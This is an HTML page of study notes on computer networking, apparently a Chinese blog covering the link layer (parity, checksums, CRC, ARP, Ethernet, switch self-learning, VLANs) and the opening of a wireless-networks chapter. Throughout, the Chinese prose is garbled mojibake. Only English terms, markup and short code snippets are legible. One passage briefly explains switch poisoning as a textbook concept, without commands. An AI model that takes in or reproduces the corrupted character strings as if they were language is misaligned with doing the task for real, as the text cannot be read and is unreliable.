ç°åœ¨å¾ˆå¤šç»¼åˆè¿›ä¸»æ¿.</p><p>é“¾è·¯å±‚æ˜¯ç¡¬ä»¶å’Œè½¯ä»¶çš„ç»“åˆä½“, å³æ­¤å¤„æ˜¯åè®®æ ˆä¸­è½¯ä»¶ä¸ç¡¬ä»¶äº¤æ¥çš„åœ°æ–¹.</p><h2 id="6-2-å·®é”™æ£€æµ‹å’Œçº æ­£æŠ€æœ¯"><a href="#6-2-å·®é”™æ£€æµ‹å’Œçº æ­£æŠ€æœ¯" class="headerlink" title="6.2 å·®é”™æ£€æµ‹å’Œçº æ­£æŠ€æœ¯"></a>6.2 å·®é”™æ£€æµ‹å’Œçº æ­£æŠ€æœ¯</h2><p>å³æ˜¯é‡‡ç”¨å·®é”™æ£€æµ‹æ¯”ç‰¹, ä¹Ÿè¿˜æ˜¯å¯èƒ½æœ‰æœªæ£€å‡ºæ¯”ç‰¹å·®é”™ (undetected bit error).</p><p>3 ç§æŠ€æœ¯:</p><ul><li>å¥‡å¶æ ¡éªŒ  (æè¿°åŸºæœ¬æ€æƒ³)</li><li>æ£€éªŒå’Œæ–¹æ³• (å¸¸ç”¨äºè¿è¾“å±‚)</li><li>å¾ªç¯å†—ä½™æ£€æµ‹ (å¸¸ç”¨äºé“¾è·¯å±‚)</li></ul><h3 id="6-2-1-å¥‡å¶æ ¡éªŒ"><a href="#6-2-1-å¥‡å¶æ ¡éªŒ" class="headerlink" title="6.2.1 å¥‡å¶æ ¡éªŒ"></a>6.2.1 å¥‡å¶æ ¡éªŒ</h3><p>å•ä¸ª <mark>å¥‡å¶æ ¡éªŒä½ (parity bit)</mark> (æŒ‡åªæ·»åŠ ä¸€ä¸ªæ¯”ç‰¹ä½)</p><p>ä¾‹å¦‚, è¦å‘é€ d æ¯”ç‰¹ä¿¡æ¯.</p><p><mark>å¶æ ¡éªŒæ–¹æ¡ˆ</mark>, é™„åŠ ä¸€ä¸ªæ¯”ç‰¹, ä½¿å¾— d + 1 æ¯”ç‰¹ä¸­ 1 çš„æ€»æ•°æ˜¯ <mark>å¶æ•°</mark>.</p><p><mark>å¥‡æ ¡éªŒæ–¹æ¡ˆ</mark>, é™„åŠ ä¸€ä¸ªæ¯”ç‰¹, ä½¿å¾— d + 1 æ¯”ç‰¹ä¸­ 1 çš„æ€»æ•°æ˜¯ <mark>å¥‡æ•°</mark>.</p><p><img src="/../img/parity_bit.png"></p><p><mark>æ¥æ”¶æ–¹</mark> éœ€è¦æ•°æ¥å—æ¯”ç‰¹ä¸­ 1 çš„æ•°ç›®.</p><p>è¿™ç§æ–¹å¼å®¹æ˜“æœªæ£€å‡ºå·®é”™, æ¯”å¦‚å¶æ ¡éªŒæ–¹æ¡ˆä¸­æœ‰å¶æ•°ä¸ªæ¯”ç‰¹å‘ç”Ÿå·®é”™å°±æ£€æµ‹ä¸å‡º.</p><p><mark>æ›´å¥å£®çš„å·®é”™æ£€æµ‹æ–¹æ¡ˆ</mark> , <mark>äºŒç»´å¥‡å¶æ£€éªŒ (two-dimensional parity)</mark>, å°† d ä¸ªæ¯”ç‰¹åˆ’åˆ†ä¸º i è¡Œ j åˆ—, å¯¹æ¯è¡Œæ¯åˆ—è®¡ç®—å¥‡å¶å€¼:</p><p><img src="/../img/two-dimensional_parity.png"></p><p>åˆ©ç”¨ç±»ä¼¼äºåæ ‡çš„å½¢å¼å¯¹é”™è¯¯è¿›è¡Œçº æ­£:</p><p><img src="/../img/adjust_mistake_of_wrong_bit_trans.png"></p><p>æ¥æ”¶æ–¹æ£€æµ‹å’Œçº æ­£å·®é”™çš„èƒ½åŠ›è¢«ç§°ä¸º <mark>å‘å‰çº é”™ (Forward Error Correction, FEC)</mark> </p><h3 id="6-2-2-æ£€éªŒå’Œæ–¹æ³•"><a href="#6-2-2-æ£€éªŒå’Œæ–¹æ³•" class="headerlink" title="6.2.2 æ£€éªŒå’Œæ–¹æ³•"></a>6.2.2 æ£€éªŒå’Œæ–¹æ³•</h3><p><mark>æ£€éªŒå’Œ</mark> æ–¹æ³•, å°† d æ¯”ç‰¹æ•°æ®ä½œä¸º k æ¯”ç‰¹çš„æ•´æ•°çš„åºåˆ—å¤„ç†. å°†è¿™äº› k æ¯”ç‰¹æ•´æ•°åŠ èµ·æ¥, ç”¨è¿™ä¸ªå’Œä½œä¸ºå·®é”™æ£€æµ‹æ¯”ç‰¹.</p><p><mark>å› ç‰¹ç½‘æ£€éªŒå’Œ</mark>, å°†æ•°æ®çš„å­—èŠ‚ä½œä¸º 16 æ¯”ç‰¹çš„æ•´æ•°å¹¶æ±‚å’Œ. <mark>è¿™ä¸ªå’Œçš„åç </mark>å½¢æˆäº†æºå¸¦åœ¨æŠ¥æ–‡æ®µé¦–éƒ¨çš„å› ç‰¹ç½‘æ£€éªŒå’Œ.</p><p><mark>æ£€æµ‹æ–¹æ³•</mark>, æ¥æ”¶æ–¹å¯¹æ¥æ”¶æ•°æ®å’Œ (åŒ…æ‹¬æ£€éªŒå’Œ) å–åç , è‹¥æ£€æµ‹ç»“æœå…¨ä¸º 1, åˆ™æ²¡æœ‰å·®é”™.</p><p><mark>åŸç†</mark>: ä¸€æ®µæ¯”ç‰¹åŠ ä¸Šè¿™æ®µæ¯”ç‰¹çš„åç , ç»“æœæ˜¯æ‰€æœ‰æ¯”ç‰¹éƒ½ä¸º 1. å¦‚:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">11110000 </span>+ <span class="hljs-number">00001111</span> = <span class="hljs-number">11111111</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">b1 </span>= æ‰€æœ‰æ¯”ç‰¹çš„å’Œ<br><span class="hljs-keyword">b2 </span>= å’Œçš„åç  (æ ¡éªŒå’Œ)<br><span class="hljs-keyword">b1 </span>+ <span class="hljs-keyword">b2 </span>= <span class="hljs-number">111</span>...<span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><h3 id="6-2-3-å¾ªç¯å†—ä½™æ£€æµ‹-Cyclic-Redundancy-Check-CRC"><a href="#6-2-3-å¾ªç¯å†—ä½™æ£€æµ‹-Cyclic-Redundancy-Check-CRC" class="headerlink" title="6.2.3 å¾ªç¯å†—ä½™æ£€æµ‹ (Cyclic Redundancy Check, CRC)"></a>6.2.3 å¾ªç¯å†—ä½™æ£€æµ‹ (Cyclic Redundancy Check, CRC)</h3><p>CRC ç¼–ç ä¹Ÿç§°ä¸ºå¤šé¡¹å¼ç¼–ç  (polynomial code). å› ä¸ºè¯¥ç¼–ç èƒ½å¤Ÿå°†è¦å‘é€çš„æ¯”ç‰¹ä¸²çœ‹ä½œä¸ºç³»æ•°æ˜¯ 0 å’Œ 1 ä¸€ä¸ªå¤šé¡¹å¼, å¯¹æ¯”ç‰¹ä¸²çš„æ“ä½œè¢«è§£é‡Šä¸ºå¤šé¡¹å¼ç®—æœ¯.</p><p>å…·ä½“è§ä¹¦.</p><h2 id="6-3-å¤šè·¯è®¿é—®é“¾è·¯å’Œåè®®"><a href="#6-3-å¤šè·¯è®¿é—®é“¾è·¯å’Œåè®®" class="headerlink" title="6.3 å¤šè·¯è®¿é—®é“¾è·¯å’Œåè®®"></a>6.3 å¤šè·¯è®¿é—®é“¾è·¯å’Œåè®®</h2><p><mark>å¤šè·¯è®¿é—®é—®é¢˜</mark> , å¦‚ä½•åè°ƒå¤šä¸ªå‘é€å’Œæ¥å—èŠ‚ç‚¹å¯¹ä¸€ä¸ªå…±äº«å¹¿æ’­ä¿¡é“çš„è®¿é—®.</p><p><mark>å¤šè·¯è®¿é—®åè®®</mark>(multiple access protocol) , èŠ‚ç‚¹é€šè¿‡è¿™äº›åè®®æ¥è§„èŒƒä»–ä»¬åœ¨å…±äº«çš„å¹¿æ’­ä¿¡é“ä¸Šçš„ä¼ è¾“è¡Œä¸º.</p><p><img src="/../img/some_ways_of_multiple_access_channel.png"></p><p>å½“å¤šä¸ªèŠ‚ç‚¹åŒæ—¶ä¼ è¾“å¸§æ—¶, æ‰€æœ‰èŠ‚ç‚¹åŒæ—¶æ¥åˆ°å¤šä¸ªå¸§, å¯¼è‡´ä¼ è¾“çš„å¸§åœ¨æ‰€æœ‰çš„æ¥æ”¶æ–¹å¤„ <mark>ç¢°æ’</mark> (collide). (å¯¼è‡´ä¸¢å¤±)</p><p>å¤šè·¯è®¿é—®åè®®åˆ†ä¸º 3 ç§ç±»å‹:</p><ul><li>ä¿¡é“åˆ’åˆ†åè®® (channel partitioning protocol)</li><li>éšæœºæ¥å…¥åè®® (random access protocol)</li><li>è½®æµåè®® (taking-turn protocol)</li></ul><h2 id="6-4-äº¤æ¢å±€åŸŸç½‘"><a href="#6-4-äº¤æ¢å±€åŸŸç½‘" class="headerlink" title="6.4 äº¤æ¢å±€åŸŸç½‘"></a>6.4 äº¤æ¢å±€åŸŸç½‘</h2><h3 id="6-4-1-é“¾è·¯å±‚å¯»å€å’Œ-ARP"><a href="#6-4-1-é“¾è·¯å±‚å¯»å€å’Œ-ARP" class="headerlink" title="6.4.1 é“¾è·¯å±‚å¯»å€å’Œ ARP"></a>6.4.1 é“¾è·¯å±‚å¯»å€å’Œ ARP</h3><h4 id="1-MAC-åœ°å€"><a href="#1-MAC-åœ°å€" class="headerlink" title="1. MAC åœ°å€"></a>1. MAC åœ°å€</h4><p>å¹¶ä¸æ˜¯ä¸»æœºæˆ–è·¯ç”±å™¨å…·æœ‰é“¾è·¯å±‚åœ°å€, è€Œæ˜¯å®ƒä»¬çš„é€‚é…å™¨ (ç½‘ç»œæ¥å£) å…·æœ‰é“¾è·¯å±‚åœ°å€.</p><p>é“¾è·¯å±‚åœ°å€æœ‰å‡ ç§ä¸åŒçš„ç§°å‘¼:</p><ul><li>LAN åœ°å€ (LAN address)</li><li>ç‰©ç†åœ°å€ (physical address)</li><li>MAC åœ°å€ (MAC address)</li></ul><p>é•¿åº¦ä¸º 6 å­—èŠ‚. å¸¸ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºå¦‚: <code>1A-23-F9-CD-06-9B</code>.</p><p>IEEE ç®¡ç†åœ°å€åˆ†é…, MAC åœ°å€æ— é‡å¤ä¸”ä¸å˜åŒ–.</p><p><mark>MAC å¹¿æ’­åœ°å€</mark> ä¸º <code>FF-FF-FF-FF-FF-FF</code>.</p><h4 id="2-åœ°å€è§£æåè®®"><a href="#2-åœ°å€è§£æåè®®" class="headerlink" title="2. åœ°å€è§£æåè®®"></a>2. åœ°å€è§£æåè®®</h4><p>ARP, Address Resolution Protocol, åœ°å€è§£æåè®®. å…¶å¯ä»¥å°† IP åœ°å€è§£æä¸º MAC åœ°å€.</p><p>æ¯å°ä¸»æœºæˆ–è·¯ç”±å™¨åœ¨å…¶å†…å­˜ä¸­å…·æœ‰ä¸€ä¸ª ARP è¡¨ (ARP table), è¿™å¼ è¡¨åŒ…å« IP åœ°å€åˆ° MAC åœ°å€çš„æ˜ å°„å…³ç³». è¯¥ ARP è¡¨ä¹ŸåŒ…å«ä¸€ä¸ªå¯¿å‘½ (TTL) å€¼, å®ƒæŒ‡ç¤ºäº†ä»è¡¨ä¸­åˆ é™¤æ¯ä¸ªæ˜ å°„çš„æ—¶é—´. (é€šå¸¸æ˜¯ 20 åˆ†é’Ÿ)</p><p><img src="/../img/arp_table.png"></p><p>å¦‚æœè¡¨ä¸­æ²¡æœ‰, åˆ™ä¼šå‘é€‚é…å™¨ä¼ é€ä¸€ä¸ª ARP æŸ¥è¯¢åˆ†ç»„, å…¶ä¼šæŒ‡ç¤ºé€‚é…å™¨å¹¿æ’­è¿™ä¸ªåˆ†ç»„.</p><p>ä¸¤ä¸ªéœ€è¦æ³¨æ„çš„äº‹:</p><ul><li>æŸ¥è¯¢ ARP æŠ¥æ–‡æ˜¯åœ¨å¹¿æ’­å¸§ä¸­å‘é€çš„, è€Œå“åº” ARP æŠ¥æ–‡åœ¨ä¸€ä¸ªæ ‡å‡†å¸§ä¸­å‘é€</li><li>ä¸€ä¸ª ARP è¡¨æ˜¯è‡ªåŠ¨å»ºç«‹çš„, ä¸éœ€è¦ç³»ç»Ÿç®¡ç†å‘˜æ¥é…ç½®</li></ul><p>å¯ä»¥æŠŠ ARP  çœ‹æˆæ˜¯è·¨è¶Šé“¾è·¯å±‚å’Œç½‘ç»œå±‚è¾¹ç•Œä¸¤è¾¹çš„åè®®.</p><h4 id="3-å‘é€æ•°æ®æŠ¥åˆ°å­ç½‘å¤–"><a href="#3-å‘é€æ•°æ®æŠ¥åˆ°å­ç½‘å¤–" class="headerlink" title="3. å‘é€æ•°æ®æŠ¥åˆ°å­ç½‘å¤–"></a>3. å‘é€æ•°æ®æŠ¥åˆ°å­ç½‘å¤–</h4><p>å½“ä¸€å°ä¸»æœºè¦å‘å­ç½‘ä¹‹å¤–çš„ä¸»æœºå‘é€ç½‘ç»œå±‚æ•°æ®æŠ¥:</p><p><img src="/../img/send_data_to_another_net.png"></p><p>ä¸€ä¸ªè·¯ç”±å™¨æ¥å£æœ‰ä¸€ä¸ª IP åœ°å€, ä¸€ä¸ª ARP æ¨¡å—å’Œä¸€ä¸ªé€‚é…å™¨.</p><h3 id="6-4-2-ä»¥å¤ªç½‘"><a href="#6-4-2-ä»¥å¤ªç½‘" class="headerlink" title="6.4.2 ä»¥å¤ªç½‘"></a>6.4.2 ä»¥å¤ªç½‘</h3><p>ä»¥å¤ªç½‘å‡ ä¹å é¢†ç€æœ‰çº¿å±€åŸŸç½‘å¸‚åœº.</p><p><mark>é›†çº¿å™¨</mark> (hub) æ˜¯ä¸€ç§ç‰©ç†å±‚è®¾å¤‡, å®ƒä½œç”¨äºå„ä¸ªæ¯”ç‰¹è€Œä¸æ˜¯ä½œç”¨äºå¸§. å½“è¡¨ç¤ºä¸€ä¸ª 0 æˆ– ä¸€ä¸ª 1 çš„æ¯”ç‰¹åˆ°è¾¾ä¸€ä¸ªæ¥å£æ—¶, é›†çº¿å™¨åªæ˜¯é‡æ–°ç”Ÿæˆè¿™ä¸ªæ¯”ç‰¹, å°†å…¶èƒ½é‡å¼ºåº¦æ”¾å¤§, å¹¶å°†è¯¥æ¯”ç‰¹å‘å…¶ä»–æ‰€æœ‰æ¥å£ä¼ é€å‡ºå».</p><p>æŸé›†çº¿å™¨åŒæ—¶ä»ä¸¤ä¸ªä¸åŒçš„æ¥å£æ¥æ”¶åˆ°å¸§, å°†å‡ºç°ä¸€æ¬¡ç¢°æ’.</p><p><mark>äº¤æ¢æœº</mark> æ˜¯ â€œæ— ç¢°æ’çš„â€.</p><h4 id="1-ä»¥å¤ªç½‘å¸§ç»“æ„"><a href="#1-ä»¥å¤ªç½‘å¸§ç»“æ„" class="headerlink" title="1. ä»¥å¤ªç½‘å¸§ç»“æ„"></a>1. ä»¥å¤ªç½‘å¸§ç»“æ„</h4><p><img src="/../img/Ether_net_frame_structure.png"></p><p>ä»¥å¤ªç½‘å¸§çš„è´Ÿè½½æ˜¯ä¸€ä¸ª IP æ•°æ®æŠ¥.</p><p>æ‰€æœ‰çš„ä»¥å¤ªç½‘æŠ€æœ¯éƒ½å‘ç½‘ç»œå±‚æä¾› <mark>æ— è¿æ¥</mark> æœåŠ¡, å³ä¸¤ä¸ªé€‚é…å™¨ä¹‹é—´ä¸æ¡æ‰‹.</p><p>ä»¥å¤ªç½‘æŠ€æœ¯éƒ½å‘ç½‘ç»œå±‚æä¾›ä¸å¯é æœåŠ¡.</p><h4 id="2-ä»¥å¤ªç½‘æŠ€æœ¯"><a href="#2-ä»¥å¤ªç½‘æŠ€æœ¯" class="headerlink" title="2. ä»¥å¤ªç½‘æŠ€æœ¯"></a>2. ä»¥å¤ªç½‘æŠ€æœ¯</h4><p>ä»¥å¤ªç½‘æŠ€æœ¯åå‰çš„æ•°å­—è¡¨æ˜é€Ÿç‡, å¦‚: <code>10BASE-2</code> ä¸­çš„ <code>10</code> ä¸º <code>10Mbps</code>. <code>BASE</code> æŒ‡åŸºå¸¦ä»¥å¤ªç½‘, è¿™æ„å‘³ç€ç‰©ç†åª’ä»‹ä»…æ‰¿è½½ä»¥å¤ªç½‘æµé‡. <code>2</code> æ˜¯ç‰©ç†åª’ä»‹.</p><p>äº¤æ¢æœºåè°ƒä¼ è¾“, åœ¨ä»»ä½•æ—¶å€™ç»ä¸ä¼šå‘ç›¸åŒçš„æ¥å£è½¬å‘è¶…è¿‡ä¸€ä¸ªå¸§.</p><h3 id="6-4-3-é“¾è·¯å±‚äº¤æ¢æœº"><a href="#6-4-3-é“¾è·¯å±‚äº¤æ¢æœº" class="headerlink" title="6.4.3 é“¾è·¯å±‚äº¤æ¢æœº"></a>6.4.3 é“¾è·¯å±‚äº¤æ¢æœº</h3><p>äº¤æ¢æœºçš„ä»»åŠ¡æ˜¯æ¥æ”¶ <mark>å…¥é“¾è·¯å±‚å¸§</mark> å¹¶å°†ä»–ä»¬è½¬å‘åˆ°å‡ºé“¾è·¯.</p><p>äº¤æ¢æœºè¾“å‡ºæ¥å£è®¾æœ‰ç¼“å­˜.</p><h4 id="1-äº¤æ¢æœºè½¬å‘å’Œè¿‡æ»¤"><a href="#1-äº¤æ¢æœºè½¬å‘å’Œè¿‡æ»¤" class="headerlink" title="1. äº¤æ¢æœºè½¬å‘å’Œè¿‡æ»¤"></a>1. äº¤æ¢æœºè½¬å‘å’Œè¿‡æ»¤</h4><p><mark>è¿‡æ»¤ (filtering)</mark> æ˜¯å†³å®šä¸€ä¸ªå¸§åº”è¯¥è½¬å‘åˆ°æŸä¸ªæ¥å£è¿˜æ˜¯åº”å½“å°†å…¶ä¸¢å¼ƒçš„äº¤æ¢æœºåŠŸèƒ½.</p><p><mark>è½¬å‘ (forwarding)</mark> æ˜¯å†³å®šä¸€ä¸ªå¸§åº”è¯¥è¢«å¯¼å‘é‚£ä¸ªæ¥å£, å¹¶æŠŠè¯¥å¸§ç§»åŠ¨åˆ°é‚£äº›æ¥å£.</p><p>äº¤æ¢æœºçš„è¿‡æ»¤å’Œè½¬å‘å€ŸåŠ©äº <mark>äº¤æ¢æœºè¡¨ (switch table)</mark> å®Œæˆ.</p><p>å…¶åŒ…æ‹¬:</p><ul><li>ä¸€ä¸ª MAC åœ°å€</li><li>é€šå‘è¯¥ MAC åœ°å€çš„äº¤æ¢æœºæ¥å£ (æ¯•ç«Ÿä¸€ä¸ªæ¥å£æ˜ å°„ä¸€ä¸ªåœ°å€, ä»è¿™ä¸ªæ¥å£å‡ºå»å°±åˆ°ä¸€ä¸ªåœ°å€)</li><li>è¡¨é¡¹æ”¾ç½®åœ¨è¡¨ä¸­çš„æ—¶é—´</li></ul><p><img src="/../img/contents_of_switch_table.png"></p><p>å‡å®šåœ°å€ <code>DD-DD-DD-DD-DD-DD</code> ä»äº¤æ¢æœºæ¥å£ <code>x</code> åˆ°è¾¾</p><p>3 ç§æƒ…å†µ:</p><ul><li>å¦‚æœæ²¡æœ‰å¯¹äºç›®çš„åœ°å€çš„è¡¨é¡¹, äº¤æ¢æœºå¹¿æ’­è¯¥å¸§</li><li>åœ°å€ <code>DD-DD-DD-DD-DD-DD</code> ä¸æ¥å£ <code>x</code> è”ç³», è¾“å‡º</li><li>åœ°å€ <code>DD-DD-DD-DD-DD-DD</code> ä¸æ¥å£ <code>y</code> è”ç³», ä» <code>y</code> è¾“å‡ºåˆ°ä¸€ä¸ªå±€åŸŸç½‘</li></ul><p>åªè¦äº¤æ¢æœºçš„è¡¨æ˜¯å®Œæ•´å’Œå‡†ç¡®çš„, è¯¥äº¤æ¢æœºæ— éœ€ä»»ä½•å¹¿æ’­å°±å‘ç›®çš„åœ°è½¬å‘å¸§.</p><h4 id="2-è‡ªå­¦ä¹ "><a href="#2-è‡ªå­¦ä¹ " class="headerlink" title="2. è‡ªå­¦ä¹ "></a>2. è‡ªå­¦ä¹ </h4><p>äº¤æ¢æœºçš„è¡¨æ˜¯è‡ªåŠ¨, åŠ¨æ€å’Œè‡ªæ²»åœ°å»ºç«‹çš„. (å³ <mark>è‡ªå­¦ä¹ </mark> çš„):</p><ul><li>äº¤æ¢æœºè¡¨åˆå§‹ä¸ºç©º</li><li>å¯¹äºåœ¨æ¯ä¸ªæ¥å£æ¥æ”¶åˆ°çš„æ¯ä¸ªå…¥å¸§, è¯¥äº¤æ¢æœºåœ¨å…¶è¡¨ä¸­å­˜å‚¨:<ol><li>åœ¨è¯¥å¸§æºåœ°å€å­—æ®µä¸­çš„ MAC åœ°å€</li><li>è¯¥å¸§åˆ°è¾¾çš„æ¥å£</li><li>å½“å‰æ—¶é—´</li></ol></li><li>å¦‚æœåœ¨ä¸€æ®µæ—¶é—´å, äº¤æ¢æœºæ²¡æœ‰æ¥æ”¶åˆ°ä»¥è¯¥åœ°å€ä½œä¸ºæºåœ°å€çš„å¸§, å°±åœ¨è¡¨ä¸­åˆ é™¤è¿™ä¸ªåœ°å€</li></ul><p>äº¤æ¢æœºæ˜¯ <mark>å³æ’å³ç”¨ (plug-and-play device)</mark> , å› ä¸ºå®ƒä»¬ä¸éœ€è¦ç½‘ç»œç®¡ç†å‘˜æˆ–ç”¨æˆ·çš„å¹²é¢„.</p><p>è¦å®‰è£…äº¤æ¢æœºçš„ç½‘ç»œç®¡ç†å‘˜é™¤äº†å°†å±€åŸŸç½‘æ®µä¸äº¤æ¢æœºçš„æ¥å£ç›¸è¿å¤–, ä¸éœ€è¦åšå…¶ä»–ä»»ä½•äº‹.</p><h4 id="3-é“¾è·¯å±‚äº¤æ¢æœºçš„æ€§è´¨"><a href="#3-é“¾è·¯å±‚äº¤æ¢æœºçš„æ€§è´¨" class="headerlink" title="3. é“¾è·¯å±‚äº¤æ¢æœºçš„æ€§è´¨"></a>3. é“¾è·¯å±‚äº¤æ¢æœºçš„æ€§è´¨</h4><p>äº¤æ¢æœºçš„æœ€å¤§èšåˆå®½å¸¦æ˜¯è¯¥äº¤æ¢æœºæ‰€æœ‰æ¥å£é€Ÿç‡ä¹‹å’Œ.</p><p>äº¤æ¢æœºä½¿å±€åŸŸç½‘ä¸­çš„ä¸åŒé“¾è·¯èƒ½å¤Ÿä»¥ä¸åŒçš„é€Ÿç‡è¿è¡Œå¹¶ä¸”èƒ½å¤Ÿåœ¨ä¸åŒçš„åª’ä½“ä¸Šè¿è¡Œ.</p><p><mark>äº¤æ¢æœºæ¯’åŒ– (switch poisoning)</mark> æ”»å‡», å®ƒå‘äº¤æ¢æœºå‘é€å¤§é‡å…·æœ‰ä¸åŒä¼ªé€ æº MAC åœ°å€çš„åˆ†ç»„, å› è€Œç”¨ä¼ªé€ è¡¨é¡¹å¡«æ»¡äº†äº¤æ¢æœºè¡¨, è¿™ä½¿äº¤æ¢æœºå¹¿æ’­å¤§å¤šæ•°å¸§, è¿™äº›å¸§åˆ™èƒ½å¤Ÿç”±å—…æ¢å™¨æ•è·åˆ°.</p><h4 id="4-äº¤æ¢æœºå’Œè·¯ç”±å™¨æ¯”è¾ƒ"><a href="#4-äº¤æ¢æœºå’Œè·¯ç”±å™¨æ¯”è¾ƒ" class="headerlink" title="4. äº¤æ¢æœºå’Œè·¯ç”±å™¨æ¯”è¾ƒ"></a>4. äº¤æ¢æœºå’Œè·¯ç”±å™¨æ¯”è¾ƒ</h4><p>äº¤æ¢æœºæ˜¯ç¬¬äºŒå±‚çš„åˆ†ç»„äº¤æ¢æœº, ç”¨ MAC åœ°å€è½¬å‘åˆ†ç»„.</p><p>è·¯ç”±å™¨æ˜¯ç¬¬ä¸‰å±‚çš„åˆ†ç»„äº¤æ¢æœº.</p><p><img src="/../img/difference_between_routor_and_switch.png"></p><p><mark>äº’è”è®¾å¤‡å…¸å‹ç‰¹è‰²æ¯”è¾ƒ</mark> :</p><p><img src="/../img/comparison_of_populer_network_devices.png"></p><p>é€šå¸¸, ç”±å‡ ç™¾å°ä¸»æœºç»„æˆçš„å°ç½‘ç»œ, ä¸”åŒ…å«å‡ ä¸ªå°ç½‘æ®µ, å¯ä»¥ä½¿ç”¨äº¤æ¢æœº.</p><p>å¯¹ç”±å‡ åƒå°ä¸»æœºç»„æˆçš„æ›´å¤§ç½‘ç»œä¸­, ç”¨è·¯ç”±å™¨æ›´å¥½.</p><h3 id="6-4-4-è™šæ‹Ÿå±€åŸŸç½‘"><a href="#6-4-4-è™šæ‹Ÿå±€åŸŸç½‘" class="headerlink" title="6.4.4 è™šæ‹Ÿå±€åŸŸç½‘"></a>6.4.4 è™šæ‹Ÿå±€åŸŸç½‘</h3><p>é™åˆ¶å¹¿æ’­æµé‡çš„èŒƒå›´å°†æ”¹å–„å±€åŸŸç½‘çš„æ€§èƒ½.</p><p><mark>è™šæ‹Ÿå±€åŸŸç½‘ (Virtual Local Network, VLAN)</mark> çš„äº¤æ¢æœº.</p><p>æ”¯æŒ VLAN çš„äº¤æ¢æœºå…è®¸ç»ä¸€ä¸ªå•ä¸€çš„ç‰©ç†å±€åŸŸç½‘åŸºç¡€è®¾æ–½å®šä¹‰å¤šä¸ªè™šæ‹Ÿå±€åŸŸç½‘. (ä¹Ÿå°±æ˜¯è¯´, å°†è¿™ä¸ªäº¤æ¢æœºæ¶è®¾åˆ°ä¸€ä¸ªå±€åŸŸç½‘ä¸­, å…¶å¯ä»¥åœ¨å†…éƒ¨åˆ’åˆ†å‡ºå¤šä¸ªè™šæ‹Ÿå±€åŸŸç½‘)</p><p>å³å°†ç«¯å£åˆ’åˆ†ä¸ºç»„, ä¸€ä¸ªç»„å†…çš„ç«¯å£å½¢æˆä¸€ä¸ªå¹¿æ’­åŸŸ.</p><p>ç½‘ç»œç®¡ç†å‘˜ä½¿ç”¨äº¤æ¢æœºç®¡ç†è½¯ä»¶å£°æ˜ä¸€ä¸ªç«¯å£å±äºæŸä¸ªç»™å®šçš„ VLAN (å…¶ä¸­æœªå£°æ˜çš„ç«¯å£å±äºä¸€ä¸ªé»˜è®¤çš„ VLAN). åœ¨äº¤æ¢æœºä¸­ç»´æŠ¤ä¸€å¼ ç«¯å£åˆ° VLAN çš„æ˜ å°„è¡¨.</p><p><mark>ä¸¤ä¸ªå®Œå…¨éš”ç¦»çš„ VLAN è¦äº¤æ¢æ•°æ®</mark>, å¯ä»¥, å°† VLAN äº¤æ¢æœºçš„ä¸€ä¸ªç«¯å£ä¸ä¸€å°å¤–éƒ¨çš„è·¯ç”±å™¨ç›¸è¿.</p><h1 id="ç¬¬7ç« -æ— çº¿ç½‘ç»œå’Œç§»åŠ¨ç½‘ç»œ"><a href="#ç¬¬7ç« -æ— çº¿ç½‘ç»œå’Œç§»åŠ¨ç½‘ç»œ" class="headerlink" title="ç¬¬7ç«  æ— çº¿ç½‘ç»œå’Œç§»åŠ¨ç½‘ç»œ"></a>ç¬¬7ç«  æ— çº¿ç½‘ç»œå’Œç§»åŠ¨ç½‘ç»œ</h1><h2 id="7-1-æ¦‚è¿°"><a href="#7-1-æ¦‚è¿°" class="headerlink" title="7.1 æ¦‚è¿°"></a>7.1 æ¦‚è¿°</h2><p>æ— çº¿ç½‘ç»œçš„ä¸‹åˆ—è¦ç´ :</p><ul><li>æ— çº¿ä¸»æœº</li><li>æ— çº¿é“¾è·¯ (wireless conmmunication link)</li><li>åŸºç«™ (base station)</li><li>ç½‘ç»œåŸºç¡€è®¾ç½®</li><li>å•è·³, åŸºäºåŸºç¡€è®¾æ–½</li><li>å•è·³, æ— åŸºç¡€è®¾æ–½</li><li>å¤šè·³, åŸºäºåŸºç¡€è®¾æ–½</li><li>å¤šè·³, æ— åŸºç¡€è®¾æ–½</li></ul><p>å½“ä¸€å°ç§»åŠ¨ä¸»æœºçš„ç§»åŠ¨è¶…å‡ºä¸€ä¸ªåŸºç«™çš„è¦†ç›–èŒƒå›´è€Œåˆ°è¾¾å¦ä¸€ä¸ªåŸºç«™çš„è¦†ç›–èŒƒå›´å, å®ƒå°†æ”¹å˜å…¶æ¥å…¥åˆ°æ›´å¤§ç½‘ç»œçš„è¿æ¥ç‚¹, è¿™ä¸€è¿‡ç¨‹å«åš <mark>åˆ‡æ¢ (handoff)</mark> </p><p>ä¸¤ä¸ªå‡†åˆ™æ¥å¯¹æ— çº¿ç½‘ç»œåˆ†ç±»:</p><ul><li>åœ¨è¯¥æ— çº¿ç½‘ç»œä¸­çš„åˆ†ç»„æ˜¯å¦è·¨è¶Šäº†ä¸€ä¸ªæ— çº¿è·³æˆ–å¤šä¸ªæ— çº¿è·³</li><li>ç½‘ç»œä¸­æ˜¯å¦æœ‰è¯¸å¦‚åŸºç«™è¿™æ ·çš„åŸºç¡€è®¾æ–½</li></ul><h2 id="7-2-æ— çº¿é“¾è·¯å’Œç½‘ç»œç‰¹å¾"><a href="#7-2-æ— çº¿é“¾è·¯å’Œç½‘ç»œç‰¹å¾" class="headerlink" title="7.2 æ— çº¿é“¾è·¯å’Œç½‘ç»œç‰¹å¾"></a>7.2 æ— çº¿é“¾è·¯å’Œç½‘ç»œç‰¹å¾</h2><p>æœ‰çº¿é“¾è·¯å’Œæ— çº¿é“¾è·¯é—´çš„è®¸å¤šé‡è¦åŒºåˆ«:</p><ul><li>é€’å‡çš„ä¿¡å·å¼ºåº¦. ç©¿è¿‡ç‰©ä½“ä»¥åŠè·¯å¾„æ¶ˆè€—(path loss)</li><li>æ¥è‡ªå…¶ä»–æºçš„å¹²æ‰°. åœ¨åŒä¸€ä¸ªé¢‘æ®µå‘é€ä¿¡å·çš„ç”µæ³¢æºå°†ç›¸äº’å¹²æ‰°</li><li>å¤šå¾„ä¼ æ’­ (multipath propagation). 